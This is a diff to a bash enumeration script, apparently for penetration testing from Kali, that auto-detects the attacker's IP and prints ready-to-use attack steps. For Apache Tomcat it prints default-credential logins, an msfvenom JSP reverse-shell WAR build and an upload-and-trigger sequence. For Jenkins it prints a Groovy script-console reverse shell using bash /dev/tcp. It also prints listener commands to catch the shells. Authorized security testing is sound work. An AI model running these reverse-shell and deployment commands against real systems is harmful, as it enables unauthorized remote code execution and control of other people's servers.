@@ -94,6 +94,11 @@ NC='\033[0m'
 disable_colors() { RED='' GREEN='' YELLOW='' BLUE='' CYAN='' MAGENTA='' BOLD='' NC=''; }
 [[ "${NO_COLOR:-0}" == "1" ]] || [[ ! -t 1 ]] && disable_colors
 
+# Auto-detect Kali IP for reverse shell commands printed during enumeration
+KALI_IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
+[[ -z "$KALI_IP" ]] && KALI_IP=$(ip -4 addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
+[[ -z "$KALI_IP" ]] && KALI_IP="<KALI_IP>"
+
 ts()      { date '+%H:%M:%S'; }
 info()    { echo -e "${BLUE}[$(ts)] [*]${NC} $*"; }
 success() { echo -e "${GREEN}[$(ts)] [+]${NC} $*"; }
@@ -1173,9 +1178,10 @@ generate_summary() {
                 echo "  Apache Tomcat detected:"
                 echo "  curl -sk ${url%/}/manager/html   # manager panel (try tomcat:tomcat, admin:admin)"
                 echo "  nxc http ${url} -u tomcat -p tomcat --path /manager/html"
-                echo "  # Deploy WAR shell: msfvenom -p java/jsp_shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f war -o shell.war"
+                echo "  # Deploy WAR shell: msfvenom -p java/jsp_shell_reverse_tcp LHOST=${KALI_IP} LPORT=4444 -f war -o shell.war"
                 echo "  # Upload via manager: curl -u 'tomcat:tomcat' -T shell.war '${url%/}/manager/text/deploy?path=/shell'"
                 echo "  # Trigger: curl ${url%/}/shell/"
+                echo "  # Catch with: penelope -p 4444 -O"
             fi
 
             # Jenkins
@@ -1186,8 +1192,9 @@ generate_summary() {
                 echo "  curl -sk ${url%/}/login   # unauthenticated check"
                 echo "  # Script console RCE (if admin access): ${url%/}/script"
                 echo "  # Groovy reverse shell in script console:"
-                echo "  # String cmd = 'bash -i >& /dev/tcp/<KALI>/4444 0>&1'"
+                echo "  # String cmd = 'bash -i >& /dev/tcp/${KALI_IP}/4444 0>&1'"
                 echo "  # ['bash','-c',cmd].execute()"
+                echo "  # Catch with: penelope -p 4444 -O"
             fi
 
             # phpMyAdmin
